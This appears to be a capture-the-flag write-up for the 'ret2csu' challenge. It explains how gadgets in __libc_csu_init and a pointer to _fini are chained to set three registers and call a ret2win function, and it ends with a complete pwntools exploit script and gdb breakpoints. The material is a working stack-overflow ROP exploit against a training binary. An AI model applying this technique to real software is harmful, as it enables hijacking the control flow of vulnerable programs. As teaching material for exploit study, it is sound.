# Challenge Theory
"ret2csu" is a simple rop challenge, but it doesn't have many rop gadgets.
This means the attacker has to resort to the universal rop technique.
It is also known as "ret2csu".
# RET2CSU Attack
To understand ret2csu, the "libc_csu_init" code needs to be looked at.
This code is contained in every binary that has been compiled and needs "libcsu".
The code is:
## "libc\_csu\_init" Assembly Code
```c
0x0000000000400640 <+0>:	push   r15
0x0000000000400642 <+2>:	push   r14
0x0000000000400644 <+4>:	mov    r15,rdx
0x0000000000400647 <+7>:	push   r13
0x0000000000400649 <+9>:	push   r12
0x000000000040064b <+11>:	lea    r12,[rip+0x20079e]        # 0x600df0
0x0000000000400652 <+18>:	push   rbp
0x0000000000400653 <+19>:	lea    rbp,[rip+0x20079e]        # 0x600df8
0x000000000040065a <+26>:	push   rbx
0x000000000040065b <+27>:	mov    r13d,edi
0x000000000040065e <+30>:	mov    r14,rsi
0x0000000000400661 <+33>:	sub    rbp,r12
0x0000000000400664 <+36>:	sub    rsp,0x8
0x0000000000400668 <+40>:	sar    rbp,0x3
0x000000000040066c <+44>:	call   0x4004d0 <_init>
0x0000000000400671 <+49>:	test   rbp,rbp
0x0000000000400674 <+52>:	je     0x400696 <__libc_csu_init+86>
0x0000000000400676 <+54>:	xor    ebx,ebx
0x0000000000400678 <+56>:	nop    DWORD PTR [rax+rax*1+0x0]
0x0000000000400680 <+64>:	mov    rdx,r15
0x0000000000400683 <+67>:	mov    rsi,r14
0x0000000000400686 <+70>:	mov    edi,r13d
0x0000000000400689 <+73>:	call   QWORD PTR [r12+rbx*8]
0x000000000040068d <+77>:	add    rbx,0x1
0x0000000000400691 <+81>:	cmp    rbp,rbx
0x0000000000400694 <+84>:	jne    0x400680 <__libc_csu_init+64>
0x0000000000400696 <+86>:	add    rsp,0x8
0x000000000040069a <+90>:	pop    rbx
0x000000000040069b <+91>:	pop    rbp
0x000000000040069c <+92>:	pop    r12
0x000000000040069e <+94>:	pop    r13
0x00000000004006a0 <+96>:	pop    r14
0x00000000004006a2 <+98>:	pop    r15
0x00000000004006a4 <+100>:	ret
```
There are two parts of this code that matter.
### First Gadget
```c
0x000000000040069a <+90>:	pop    rbx
0x000000000040069b <+91>:	pop    rbp
0x000000000040069c <+92>:	pop    r12
0x000000000040069e <+94>:	pop    r13
0x00000000004006a0 <+96>:	pop    r14
0x00000000004006a2 <+98>:	pop    r15
0x00000000004006a4 <+100>:	ret
```
These can pop values into registers which are used in the next gadget.
### Second Gadget
```c
0x0000000000400680 <+64>:	mov    rdx,r15
0x0000000000400683 <+67>:	mov    rsi,r14
0x0000000000400686 <+70>:	mov    edi,r13d
0x0000000000400689 <+73>:	call   QWORD PTR [r12+rbx*8]
```
This will move the values into the registers, and the do a call.
The call is complicated.
It will derefernce the value calculated and then call that.
So if the value if the brackets is 0x5.
It will get the value at 0x5 and then call that.
The attacker has to find a pointer to something that will either do what they want, or do nothing.
More on the nothing route later.
# Solution and Exploit Theory
This challenge actually has a "ret2win" function which will print the flag.
It needs 3 arguments, which can be populated by the "ret2csu" method along with an extra pop.
The other thing that needs to be enumerated would be the is the "nothing route".
Since the call instruction deferences a pointer, a pointer to code is needed.
One can use the "_fini" function found within libc.
## \_fini Code
```c
   0x00000000004006b4 <+0>:	sub    rsp,0x8
   0x00000000004006b8 <+4>:	add    rsp,0x8
   0x00000000004006bc <+8>:	ret    
```
This code does nothing, because of the symmetric operation on the stack.
## Getting the Pointer to "\_fini"
```bash
\<pwndbg\>search -p 0x4006b4
```
This searchers for a pointer to the attacker "\_fini" code.
# Exploit
The exploit functions as:
```
stack smash
gadget to pop all the values
0 for rbx
1 for rbp
address of _fini
ret2win arg1
ret2win arg2
ret2win arg3
gadget to move the values into registers and do the call
0x0
0x0
0x0
0x0
0x0
0x0
0x0
pop rdi
arg1
ret2win
```
Most of the exploit has already been explained.
However, there are more parts that need to be explained.
First, there is the 0 and 1 for the rbp and rbx registers.
This is because the exploit comes across a comparison after moving through the "\_fini" section.
This code also adds 1 to rbx.
This means the code will fall through instead of making the jump.
The code will also return back to the pop gadget.
So the extra zeroes are there, so that the rest of the exploit does not end up inside the registers.
After this, the last argument is popped into the rdi register, and ret2win is called.
# Full Exploit Script
```python
#!/usr/bin/python3
import pwn
import sys
binary = "ret2csu"
pwn.context.binary = binary
pwn.context.encoding = "latin"

'''
Exploit:
    ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
    rdi: 0xdeadbeefdeadbeef
    rsi: 0xcafebabecafebabe
    rdx: 0xd00df00dd00df00d
'''

padding = 40
gadgets = {
    "csuinit_pop":0x40069a,
    "csinit_call":0x400680,
    "pop_rdi_ret":0x4006a3,
    "address_ret2win":0x400510,
    "_fini_ptr":0x6003b0
}

payload = pwn.flat(
    b"A"*padding,
    pwn.p64(gadgets["csuinit_pop"]),
    pwn.p64(0x0),
    pwn.p64(0x1),
    pwn.p64(gadgets["_fini_ptr"]),
    pwn.p64(0xdeadbeefdeadbeef),
    pwn.p64(0xcafebabecafebabe),
    pwn.p64(0xd00df00dd00df00d),
    pwn.p64(gadgets["csinit_call"]),
    pwn.p64(0x0),
    pwn.p64(0x0),
    pwn.p64(0x0),
    pwn.p64(0x0),
    pwn.p64(0x0),
    pwn.p64(0x0),
    pwn.p64(0x0),
    pwn.p64(gadgets["pop_rdi_ret"]),
    pwn.p64(0xdeadbeefdeadbeef),
    pwn.p64(gadgets["address_ret2win"])
)

if ("input" in sys.argv):
    with open("input", "wb") as io:
        io.write(payload)

if ("log" in sys.argv):
    pwn.context.log_level = "debug"

with pwn.process(binary) as io:
    pwn.info(io.readrepeat(1))

    io.send(payload)

    if ("interactive" in sys.argv):
        io.interactive()

    if ("output" in sys.argv):
        pwn.info(io.readrepeat(1))
```
# Debugging Script
```bash
b *0x400510
b *0x4006a3
r < input
b *0x40069a
b *0x400680
```